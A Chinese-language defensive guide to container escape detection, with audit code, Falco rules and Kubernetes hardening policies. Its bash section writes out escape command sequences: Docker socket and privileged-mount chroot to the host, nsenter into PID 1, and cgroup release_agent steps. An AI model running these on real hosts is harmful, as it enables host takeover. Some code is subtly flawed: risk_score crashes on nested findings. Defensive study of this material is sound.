---
id: "33-004"
title: "容器逃逸检测与防御 (Container Escape Detection & Defense)"
category: "容器安全"
category_en: "Container Security"
difficulty: "★★★★★"
tools: "Falco, AppArmor, Seccomp, gVisor, kata-containers"
last_updated: "2026-05"
tags: [container-security, escape-detection, sandbox, privilege-escalation, defense]
subdomain: container-security
nist_csf: [PR.AC-05, PR.PT-01, DE.CM-08, DE.CM-01]
mitre_attack: [T1525, T1578, T1610, T1611]
---

# 容器逃逸检测与防御 (Container Escape Detection & Defense)

## 概述

容器逃逸是容器安全中最严重的威胁之一。攻击者利用容器引擎漏洞、配置错误或内核漏洞突破容器隔离，获取宿主机权限。本技能覆盖容器逃逸技术分析、逃逸检测方法和多层防御策略。

## 核心技能

### 1. 容器逃逸技术概览

```python
"""容器逃逸技术分类"""

class ContainerEscapeTechnique:
    """容器逃逸技术分类与检测"""
    
    TECHNIQUES = {
        "privileged_escape": {
            "name": "特权模式逃逸",
            "risk": "CRITICAL",
            "description": "容器在 --privileged 模式下运行，拥有全部宿主机权限",
            "detection": "检查容器 securityContext.privileged == true"
        },
        "mount_escape": {
            "name": "挂载逃逸",
            "risk": "CRITICAL",
            "description": "攻击者挂载宿主机敏感目录（/var/run/docker.sock, /dev, /proc）",
            "detection": "检查容器挂载的宿主机敏感路径"
        },
        "kernel_vuln_escape": {
            "name": "内核漏洞逃逸",
            "risk": "HIGH",
            "description": "利用 Linux 内核漏洞（如 Dirty Pipe CVE-2022-0847）逃逸",
            "detection": "内核版本检测 + 异常系统调用"
        },
        "capability_escape": {
            "name": "Capability 滥用逃逸",
            "risk": "HIGH",
            "description": "利用 SYS_ADMIN, SYS_PTRACE 等 Capability 逃逸",
            "detection": "检查容器 Capability 配置"
        },
        "cgroup_escape": {
            "name": "Cgroup 逃逸",
            "risk": "HIGH",
            "description": "利用 cgroup notify_on_release 机制逃逸",
            "detection": "检测 cgroup 相关写入操作"
        },
        "nsenter_escape": {
            "name": "nsenter 逃逸",
            "risk": "CRITICAL",
            "description": "使用 nsenter 进入宿主机命名空间",
            "detection": "监控 nsenter syscall"
        }
    }
    
    @classmethod
    def get_escape_indicators(cls):
        """列出逃逸指标"""
        indicators = {
            "配置文件": [
                "privileged: true",
                "hostPID: true",
                "hostNetwork: true",
                "hostIPC: true",
                "volume mount /var/run/docker.sock",
                "volume mount /dev/",
                "volume mount /proc/",
                "volume mount /sys/",
                "capabilities: SYS_ADMIN",
                "capabilities: SYS_PTRACE",
                "capabilities: SYS_MODULE"
            ],
            "运行行为": [
                "mount /dev/sda1 /mnt",
                "insmod kernel_module.ko",
                "cat /proc/1/environ",
                "nsenter --target 1 --mount",
                "docker run -v /:/host --privileged",
                "chroot /host"
            ]
        }
        return indicators

# 使用示例
for tech_id, tech in ContainerEscapeTechnique.TECHNIQUES.items():
    print(f"[{tech['risk']}] {tech['name']}: {tech['description']}")
```

### 2. 常见逃逸手法与检测

```bash
# 1. Docker Socket 挂载逃逸
# 检测条件: 容器挂载了 /var/run/docker.sock
# 攻击命令:
docker run -v /var/run/docker.sock:/var/run/docker.sock -it ubuntu bash

# 在容器内执行逃逸:
# 安装 Docker CLI
apt-get update && apt-get install -y docker.io
# 操作宿主机 Docker
docker run -v /:/host -it alpine chroot /host
# 或
docker exec -it host-shell bash

# Falco 检测规则:
- rule: Detect Docker Socket Mount
  desc: Container with Docker socket mounted
  condition: container and mount and fd.name = /var/run/docker.sock
  output: Docker socket mounted in container (user=%user.name container=%container.id)
  priority: CRITICAL
  tags: [container, escape, mitre_privilege_escalation]

# 2. 特权模式逃逸
# 检测条件: --privileged 标志
docker run --privileged -it ubuntu bash

# 在容器内逃逸到宿主机:
# 查看宿主机设备
fdisk -l
# 挂载宿主机文件系统
mkdir /host && mount /dev/sda1 /host
chroot /host

# 另类逃逸:
# 使用 nsenter
nsenter --target 1 --mount --uts --ipc --net --pid

# Falco 检测特权容器
- rule: Privileged Container Detected
  desc: Container started with privileged mode
  condition: >
    container_started and container.privileged=true
  output: Privileged container started (container=%container.id image=%container.image)
  priority: CRITICAL
  tags: [container, escape, mitre_privilege_escalation]

# 3. Capability 滥用 — SYS_ADMIN + 新命名空间
docker run --cap-add=SYS_ADMIN --security-opt apparmor=unconfined -it ubuntu bash

# 逃逸步骤:
# 创建 cgroup
mkdir /sys/fs/cgroup/pids/escape
# 设置 notify_on_release
echo 1 > /sys/fs/cgroup/pids/escape/notify_on_release
# 设置 release_agent
echo "/escape" > /sys/fs/cgroup/release_agent
# 触发释放
echo $$ > /sys/fs/cgroup/pids/escape/cgroup.procs

# 4. 内核漏洞逃逸 — Dirty Pipe (CVE-2022-0847)
# 影响版本: Linux 5.8 - 5.16.11
# 利用条件: 容器与宿主机共享内核
# 检测: uname -r 检查内核版本
```

### 3. 防御策略实施

```yaml
# Kubernetes Pod 安全配置 — 防止容器逃逸
apiVersion: v1
kind: Pod
metadata:
  name: escape-proof-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 2000
    seccompProfile:
      type: RuntimeDefault
    appArmorProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: app:1.0
    securityContext:
      allowPrivilegeEscalation: false
      privileged: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
      seccompProfile:
        type: RuntimeDefault
    volumeMounts:
    # 永远不要挂载:
    # - /var/run/docker.sock
    # - /dev/ (只读除外)
    # - /proc/ (只读除外)
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: tmp
    emptyDir: {}
---
# OPA Gatekeeper 策略 — 禁止特权容器
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sPSPPrivilegedContainer
metadata:
  name: no-privileged-containers
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
  validation:
    message: "Privileged container is not allowed — prevents container escape"
---
# 禁止敏感挂载
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sblockhostmounts
spec:
  crd:
    spec:
      names:
        kind: K8sBlockHostMounts
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8sblockhostmounts
      violation[{"msg": msg}] {
        volume := input.review.object.spec.volumes[_]
        volume.hostPath.path == "/var/run/docker.sock"
        msg := sprintf("Mounting Docker socket is forbidden: %v", [volume.hostPath.path])
      }
```

```bash
# 二层防御 — 沙箱运行时
# gVisor — 用户态内核沙箱
# 安装 gVisor
wget https://storage.googleapis.com/gvisor/releases/release/latest/x86_64/runsc
chmod +x runsc
sudo mv runsc /usr/local/bin/

# 配置 Docker 使用 runsc
sudo runsc install
docker run --runtime=runsc -it ubuntu bash

# kata-containers — 硬件虚拟化隔离
# 安装 kata
sudo apt-get install kata-containers

# 配置 Docker 使用 kata
sudo mkdir -p /etc/docker
cat > /etc/docker/daemon.json << 'EOF'
{
  "runtimes": {
    "kata": {
      "path": "/usr/bin/kata-runtime"
    }
  }
}
EOF
systemctl restart docker

# 运行 kata 容器
docker run --runtime=kata -it ubuntu bash
```

### 4. 逃逸检测自动化

```python
"""容器逃逸检测引擎"""

class EscapeDetector:
    """容器逃逸检测引擎"""
    
    def __init__(self):
        self.checks = [
            self._check_privileged,
            self._check_sensitive_mounts,
            self._check_dangerous_caps,
            self._check_host_access
        ]
    
    def check_container_config(self, container_spec):
        """检查容器配置是否存在逃逸风险"""
        findings = []
        for check in self.checks:
            result = check(container_spec)
            if result:
                findings.append(result)
        return findings
    
    def _check_privileged(self, spec):
        """检查特权模式"""
        sec = spec.get("securityContext", {})
        if sec.get("privileged"):
            return {
                "type": "privileged",
                "severity": "CRITICAL",
                "message": "容器运行在特权模式下，可完全访问宿主机"
            }
        return None
    
    def _check_sensitive_mounts(self, spec):
        """检查敏感挂载"""
        sensitive_paths = {
            "/var/run/docker.sock": "CRITICAL — 可完全控制宿主机 Docker",
            "/dev/": "HIGH — 可访问宿主机设备",
            "/proc/": "MEDIUM — 可读取宿主机进程信息",
            "/sys/": "HIGH — 可修改内核参数",
            "/etc/": "MEDIUM — 可修改宿主机关联文件"
        }
        
        findings = []
        for vol in spec.get("volumes", []):
            host_path = vol.get("hostPath", {}).get("path", "")
            for sensitive, risk in sensitive_paths.items():
                if sensitive in host_path:
                    findings.append({
                        "type": "sensitive_mount",
                        "severity": risk.split(" — ")[0],
                        "message": f"挂载敏感路径 {host_path}: {risk}"
                    })
        return findings if findings else None
    
    def _check_dangerous_caps(self, spec):
        """检查危险 Capability"""
        dangerous_caps = [
            "SYS_ADMIN", "SYS_PTRACE", "SYS_MODULE",
            "DAC_OVERRIDE", "SYS_RAWIO", "NET_ADMIN",
            "MAC_ADMIN", "IPC_LOCK"
        ]
        
        caps = spec.get("securityContext", {}).get("capabilities", {}).get("add", [])
        found = [c for c in caps if c in dangerous_caps]
        
        if found:
            return {
                "type": "dangerous_capabilities",
                "severity": "HIGH",
                "message": f"容器包含危险 Capability: {', '.join(found)}"
            }
        return None
    
    def _check_host_access(self, spec):
        """检查宿主机命名空间共享"""
        findings = []
        if spec.get("hostPID"):
            findings.append({
                "type": "host_pid",
                "severity": "HIGH",
                "message": "共享宿主机 PID 命名空间"
            })
        if spec.get("hostNetwork"):
            findings.append({
                "type": "host_network",
                "severity": "HIGH",
                "message": "共享宿主机网络命名空间"
            })
        return findings if findings else None
    
    def risk_score(self, findings):
        """计算逃逸风险评分"""
        weights = {"CRITICAL": 10, "HIGH": 5, "MEDIUM": 2, "LOW": 1}
        score = sum(weights.get(f.get("severity", "LOW"), 0) for f in findings)
        return min(score, 100)

# 使用示例
detector = EscapeDetector()
findings = detector.check_container_config({
    "securityContext": {
        "privileged": True,
        "capabilities": {"add": ["SYS_ADMIN", "SYS_PTRACE"]}
    },
    "volumes": [{"hostPath": {"path": "/var/run/docker.sock"}}],
    "hostPID": False,
    "hostNetwork": True
})
for f in findings:
    if isinstance(f, list):
        for item in f:
            print(f"[{item['severity']}] {item['message']}")
    elif f:
        print(f"[{f['severity']}] {f['message']}")
print(f"Risk Score: {detector.risk_score(findings)}/100")
```

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| gVisor | 用户态内核沙箱 | https://gvisor.dev/ |
| kata-containers | 硬件虚拟化容器 | https://katacontainers.io/ |
| Falco | 逃逸行为检测 | https://falco.org/ |
| AppArmor | MAC 强制访问控制 | https://apparmor.net/ |
| Cilium Tetragon | eBPF 逃逸检测 | https://github.com/cilium/tetragon |

## 参考资源

- [Container Escape Techniques — Trail of Bits](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [CIS Docker Benchmark — Escape Prevention](https://www.cisecurity.org/benchmark/docker)
- [NSA Container Hardening Guide](https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.1_20220829.PDF)
- [gVisor Security Model](https://gvisor.dev/docs/architecture/security/)
- [Docker Security — Seccomp & AppArmor](https://docs.docker.com/engine/security/)
